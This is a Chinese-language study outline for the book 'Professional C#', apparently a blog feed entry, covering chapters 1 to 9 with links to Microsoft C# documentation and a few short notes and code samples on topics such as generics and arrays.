        <updated>2020-04-30T08:26:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>内容以《C#高级编程》为索引，《C#编程指南》、《C#语言规范》等官方文档为参考。</p>
<h1 id="chapter-1-net-applications-and-tools">Chapter 1: .NET Applications and Tools</h1>
<ul>
<li>建议跳过。</li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/getting-started/introduction-to-the-csharp-language-and-the-net-framework">C# 语言和 .NET Framework 简介</a></li>
</ul>
<h1 id="chapter-2-core-c">Chapter 2: Core C#</h1>
<h2 id="fundamentals-of-c">FUNDAMENTALS OF C#</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/tutorials/intro-to-csharp/">C# 简介</a></li>
</ul>
<h2 id="working-with-variables">WORKING WITH VARIABLES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/tour-of-csharp/types-and-variables">类型和变量</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/types/#types-variables-and-values">类型（C# 编程指南）</a></li>
</ul>
<h2 id="using-predefined-data-types">USING PREDEFINED DATA TYPES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/builtin-types/built-in-types">内置类型（C# 参考）</a></li>
</ul>
<h2 id="controlling-program-flow">CONTROLLING PROGRAM FLOW</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/language-specification/statements#selection-statements">选择语句</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/language-specification/statements#iteration-statements">迭代语句</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/language-specification/statements#jump-statements">跳转语句</a></li>
</ul>
<h2 id="getting-organized-with-namespaces">GETTING ORGANIZED WITH NAMESPACES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/namespaces/">命名空间（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/language-specification/namespaces">命名空间</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/language-specification/namespaces#using-directives">using 指令</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/keywords/using-directive">using 指令（C# 参考）</a></li>
</ul>
<h2 id="understanding-the-main-method">UNDERSTANDING THE MAIN METHOD</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/main-and-command-args/">Main() 和命令行参数（C# 编程指南）</a></li>
</ul>
<h2 id="using-comments">USING COMMENTS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/language-specification/documentation-comments">文档注释</a></li>
</ul>
<h2 id="understanding-c-preprocessor-directives">UNDERSTANDING C# PREPROCESSOR DIRECTIVES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/">C# 预处理器指令</a></li>
</ul>
<p>这部分内容建议跳过，以后用到再补。</p>
<h2 id="c-programming-guidelines">C# PROGRAMMING GUIDELINES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/design-guidelines/naming-guidelines">命名规则</a></li>
</ul>
<h1 id="chapter-3-objects-and-types">Chapter 3: Objects and Types</h1>
<h2 id="classes-and-structs">CLASSES AND STRUCTS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/classes-and-structs/">类和结构（C# 编程指南）</a></li>
</ul>
<h2 id="classes">CLASSES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/classes-and-structs/classes">类（C# 编程指南）</a></li>
</ul>
<h2 id="structs">STRUCTS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/builtin-types/struct">结构类型（C# 参考）</a></li>
</ul>
<h2 id="passing-parameters-by-value-and-by-reference">PASSING PARAMETERS BY VALUE AND BY REFERENCE</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/classes-and-structs/passing-value-type-parameters">传递值类型参数（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/classes-and-structs/passing-reference-type-parameters">传递引用类型参数（C# 编程指南）</a></li>
</ul>
<h2 id="nullable-types">NULLABLE TYPES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/builtin-types/nullable-value-types">可为空的值类型（C# 参考）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/null-coalescing-operator">?? 和 ??= 运算符（C# 参考）</a></li>
</ul>
<h2 id="enum-types">ENUM TYPES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/language-specification/enums">枚举</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/builtin-types/enum">枚举类型（C# 参考）</a></li>
</ul>
<h2 id="partial-classes">PARTIAL CLASSES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/classes-and-structs/partial-classes-and-methods">分部类和方法（C# 编程指南）</a></li>
</ul>
<h2 id="extension-methods">EXTENSION METHODS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/classes-and-structs/extension-methods">扩展方法（C# 编程指南）</a></li>
</ul>
<h1 id="chapter-4-object-oriented-programming-with-c">Chapter 4: Object-Oriented Programming with C#</h1>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/object-oriented-programming">面向对象的编程 (C#)</a></li>
</ul>
<h2 id="object-orientation">OBJECT ORIENTATION</h2>
<blockquote>
<p>The three most important concepts of object-orientation are inheritance, encapsulation, and polymorphism.</p>
</blockquote>
<p>封装、继承、多态是面向对象的编程的三个主要特征。</p>
<h2 id="inheritance">INHERITANCE</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/classes-and-structs/inheritance">继承（C# 编程指南）</a></li>
</ul>
<h2 id="modifiers">MODIFIERS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/classes-and-structs/access-modifiers">访问修饰符（C# 编程指南）</a></li>
</ul>
<h2 id="interfaces">INTERFACES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/interfaces/">接口（C# 编程指南）</a></li>
</ul>
<h2 id="is-and-as-operators">IS AND AS OPERATORS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/how-to/safely-cast-using-pattern-matching-is-and-as-operators">如何使用模式匹配以及 is 和 as 运算符安全地进行强制转换</a></li>
</ul>
<h1 id="chapter-5-generics">Chapter 5: Generics</h1>
<h2 id="generics-overview">GENERICS OVERVIEW</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/generics/">泛型（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/generics/">.NET 中的泛型</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/generics/generic-type-parameters">泛型类型参数 -（C# 编程指南）</a></li>
</ul>
<h2 id="creating-generic-classes">CREATING GENERIC CLASSES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/generics/generic-classes">泛型类（C# 编程指南）</a></li>
</ul>
<h2 id="generics-features">GENERICS FEATURES</h2>
<h3 id="default-values">Default Values</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/visual-studio-2010/xwth0h0d(v=vs.100)">泛型代码中的默认关键字（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/default">default value 表达式（C# 参考）</a></li>
</ul>
<h3 id="constraints">Constraints</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/generics/constraints-on-type-parameters">类型参数的约束（C# 编程指南）</a></li>
</ul>
<h3 id="inheritance-2">Inheritance</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/generics/generic-classes">泛型类（C# 编程指南）</a></li>
</ul>
<h3 id="static-members">Static Members</h3>
<blockquote>
<p>Static members of generic classes are shared with only one instantiation of the class, and they require special attention. Consider the following example, where the class <code>StaticDemo&lt;T&gt;</code> contains the static field <code>x</code>:</p>
<pre><code class="language-csharp">public class StaticDemo&lt;T&gt;
{
        public static int x;
}
</code></pre>
<p>Because the class <code>StaticDemo&lt;T&gt;</code> is used with both a <code>string</code> type and an <code>int</code> type, two sets of static fields exist:</p>
<pre><code class="language-csharp">StaticDemo&lt;string&gt;.x = 4;
StaticDemo&lt;int&gt;.x = 5;
Console.WriteLine(StaticDemo&lt;string&gt;.x); // writes 4
</code></pre>
</blockquote>
<p>泛型类是支持静态成员的，但官方不建议这么做。</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/visualstudio/code-quality/ca1000?view=vs-2019">CA1000: Do not declare static members on generic types</a></li>
</ul>
<h2 id="generic-interfaces">GENERIC INTERFACES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/generics/interfaces">泛型接口</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/generics/generic-interfaces">泛型接口（C# 编程指南）</a></li>
</ul>
<h3 id="covariance-and-contra-variance">Covariance and Contra-Variance</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/covariance-contravariance/">协变和逆变 (C#)</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/generics/covariance-and-contravariance">泛型中的协变和逆变</a></li>
</ul>
<h3 id="covariance-with-generic-interfaces">Covariance with Generic Interfaces</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/generics/covariance-and-contravariance#generic-interfaces-with-covariant-type-parameters">具有协变类型参数的泛型接口</a></li>
</ul>
<h3 id="contra-variance-with-generic-interfaces">Contra-Variance with Generic Interfaces</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/generics/covariance-and-contravariance#generic-interfaces-with-contravariant-generic-type-parameters">具有逆变泛型类型参数的泛型接口</a></li>
</ul>
<h2 id="generic-structs">GENERIC STRUCTS</h2>
<blockquote>
<p>Similar to classes, structs can be generic as well. They are very similar to generic classes with the exception of inheritance features.</p>
</blockquote>
<p>泛型结构体除了无法继承，其他和泛型类相似。</p>
<p>书上关于 <code>Nullable&lt;T&gt;</code> 的代码运行失败，跳过这部分。</p>
<h2 id="generic-methods">GENERIC METHODS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/generics/generic-methods">泛型方法（C# 编程指南）</a></li>
</ul>
<h1 id="chapter-6-operators-and-casts">Chapter 6: Operators and Casts</h1>
<h3 id="operators">OPERATORS</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/">C# 运算符（C# 参考）</a></li>
</ul>
<h3 id="the-checked-and-unchecked-operators">The checked and unchecked Operators</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/keywords/checked">checked（C# 参考）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/keywords/unchecked">unchecked（C# 参考）</a></li>
</ul>
<h3 id="the-is-operator">The <code>is</code> Operator</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/keywords/is">is（C# 参考）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/type-testing-and-cast#is-operator">is 运算符</a></li>
</ul>
<h3 id="the-as-operator">The <code>as</code> Operator</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/how-to/safely-cast-using-pattern-matching-is-and-as-operators">如何使用模式匹配以及 is 和 as 运算符安全地进行强制转换</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/type-testing-and-cast#as-operator">as 运算符</a></li>
</ul>
<h3 id="the-sizeof-operator">The <code>sizeof</code> Operator</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/sizeof">sizeof 运算符（C# 参考）</a></li>
</ul>
<h3 id="the-typeof-operator">The <code>typeof</code> Operator</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/type-testing-and-cast#typeof-operator">typeof 运算符</a></li>
</ul>
<h3 id="the-nameof-operator">The <code>nameof</code> Operator</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/nameof">nameof 表达式（C# 参考）</a></li>
</ul>
<h3 id="the-index-operator">The <code>index</code> Operator</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/arrays/">数组（C# 编程指南）</a></li>
</ul>
<h3 id="nullable-types-and-operators">Nullable Types and Operators</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/builtin-types/nullable-value-types">可为空的值类型（C# 参考）</a></li>
</ul>
<h3 id="the-null-coalescing-operator">The Null Coalescing Operator</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/null-coalescing-operator">?? 和 ??= 运算符（C# 参考）</a></li>
</ul>
<h3 id="the-null-conditional-operator">The Null-Conditional Operator</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/member-access-operators#null-conditional-operators--and-">Null 条件运算符 ?. 和 ?[]</a></li>
</ul>
<h3 id="operator-precedence-and-associativity">Operator Precedence and Associativity</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/#operator-precedence">运算符优先级</a></li>
</ul>
<h2 id="using-binary-operators">USING BINARY OPERATORS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/bitwise-and-shift-operators">位运算符和移位运算符（C# 参考）</a></li>
</ul>
<h2 id="type-safety">TYPE SAFETY</h2>
<h3 id="type-conversions">Type Conversions</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/types/casting-and-type-conversions">强制转换和类型转换（C# 编程指南）</a></li>
</ul>
<h3 id="boxing-and-unboxing">Boxing and Unboxing</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/types/boxing-and-unboxing">装箱和取消装箱（C# 编程指南）</a></li>
</ul>
<h2 id="comparing-objects-for-equality">COMPARING OBJECTS FOR EQUALITY</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/statements-expressions-operators/equality-comparisons">相等性比较（C# 编程指南）</a></li>
</ul>
<h2 id="operator-overloading">OPERATOR OVERLOADING</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/operator-overloading">运算符重载（C# 引用）</a></li>
</ul>
<h2 id="implementing-custom-index-operators">IMPLEMENTING CUSTOM INDEX OPERATORS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/indexers/">索引器（C# 编程指南）</a></li>
</ul>
<h2 id="user-defined-casts">USER-DEFINED CASTS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/user-defined-conversion-operators">用户定义转换运算符（C# 引用）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/language-specification/conversions#user-defined-conversions">用户定义的转换</a></li>
</ul>
<h1 id="chapter-7-arrays">Chapter 7: Arrays</h1>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/arrays/">数组（C# 编程指南）</a></li>
</ul>
<h2 id="simple-arrays">SIMPLE ARRAYS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/arrays/single-dimensional-arrays">一维数组（C# 编程指南）</a></li>
</ul>
<h2 id="multidimensional-arrays">MULTIDIMENSIONAL ARRAYS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/arrays/multidimensional-arrays">多维数组（C# 编程指南）</a></li>
</ul>
<h2 id="jagged-arrays">JAGGED ARRAYS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/arrays/jagged-arrays">交错数组（C# 编程指南）</a></li>
</ul>
<h2 id="ranger">RANGER</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/tutorials/ranges-indexes">索引和范围</a></li>
</ul>
<h2 id="array-class">ARRAY CLASS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.array?view=netcore-3.1">Array 类</a></li>
</ul>
<h3 id="copying-arrays">Copying Arrays</h3>
<h4 id="shallow-copy">Shallow copy</h4>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.array.constrainedcopy?view=netcore-3.1">Array.ConstrainedCopy</a> 推荐！</li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.array.copy?view=netcore-3.1">Array.Copy 方法</a> <code>Array.ConstrainedCopy</code> 的弱化版，复制失败时可能会破坏目标数组。</li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.array.copyto?view=netcore-3.1">Array.CopyTo 方法</a> 只能复制一维数组。</li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.array.clone?view=netcore-3.1">Array.Clone 方法</a> 返回值是 <code>object</code> 类型。</li>
</ul>
<h4 id="deep-copy">Deep copy</h4>
<blockquote>
<p>If you need a deep copy of an array containing reference types, you have to iterate the array and create new objects.</p>
</blockquote>
<h2 id="arrays-as-parameters">ARRAYS AS PARAMETERS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/arrays/passing-arrays-as-arguments">将数组作为参数传递（C# 编程指南）</a></li>
</ul>
<h2 id="enumerators">ENUMERATORS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/arrays/using-foreach-with-arrays">对数组使用 foreach（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/iterators">迭代器 (C#)</a></li>
</ul>
<h2 id="structural-comparison">STRUCTURAL COMPARISON</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.collections.structuralcomparisons?view=netcore-3.1">StructuralComparisons 类</a></li>
</ul>
<h2 id="spans">SPANS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.span-1?view=netcore-3.1">跨<T > 和数组</a></li>
</ul>
<h2 id="array-pools">ARRAY POOLS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.buffers.arraypool-1?view=netcore-3.1">ArrayPool<T> 类</a></li>
</ul>
<h1 id="chapter-8-delegates-lambdas-and-events">Chapter 8: Delegates, Lambdas, and Events</h1>
<h2 id="delegates">DELEGATES</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/delegates-overview">委托简介</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/delegates/">委托（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/delegates-lambdas">委托和 lambda</a></li>
</ul>
<h3 id="simple-delegate-example">Simple Delegate Example</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/delegate-class">System.Delegate 和 delegate 关键字</a></li>
</ul>
<h3 id="actiont-and-funct-delegates">Action<T> and Func<T> Delegates</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/delegates-strongly-typed">强类型委托</a></li>
</ul>
<h3 id="multicast-delegates">Multicast Delegates</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/delegates/how-to-combine-delegates-multicast-delegates">如何合并委托（多播委托）（C# 编程指南）</a></li>
</ul>
<h3 id="anonymous-methods">Anonymous Methods</h3>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/delegates/delegates-with-named-vs-anonymous-methods">带有命名方法的委托与匿名方法（C# 编程指南）</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/operators/delegate-operator">delegate 运算符 -（C# 参考）</a></li>
</ul>
<h2 id="lambda-expressions">LAMBDA EXPRESSIONS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/statements-expressions-operators/lambda-expressions">Lambda 表达式（C# 编程指南）</a></li>
</ul>
<h2 id="events">EVENTS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/events-overview">事件介绍</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/events/">事件（C# 编程指南）</a></li>
</ul>
<h1 id="chapter-9-strings-and-regular-expressions">Chapter 9: Strings and Regular Expressions</h1>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/strings/">字符串（C# 编程指南）</a></li>
</ul>
<h2 id="examining-systemstring">EXAMINING SYSTEM.STRING</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.string?view=netcore-3.1">String 类</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/base-types/stringbuilder">使用 .NET 中的 StringBuilder 类</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.text.stringbuilder?view=netcore-3.1">StringBuilder 类</a></li>
</ul>
<h2 id="string-formats">STRING FORMATS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/strings/#format-strings">格式字符串</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/base-types/parsing-strings">分析 .NET 中的字符串</a></li>
</ul>
<h2 id="regular-expressions">REGULAR EXPRESSIONS</h2>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/base-types/regular-expressions">.NET 正则表达式</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/base-types/regular-expression-language-quick-reference">正则表达式语言 - 快速参考</a></li>
</ul>
<h2 id="strings-and-spans">STRINGS AND SPANS</h2>
<p>高阶知识，暂时跳过。</p>
]]></content>
    </entry>
</feed>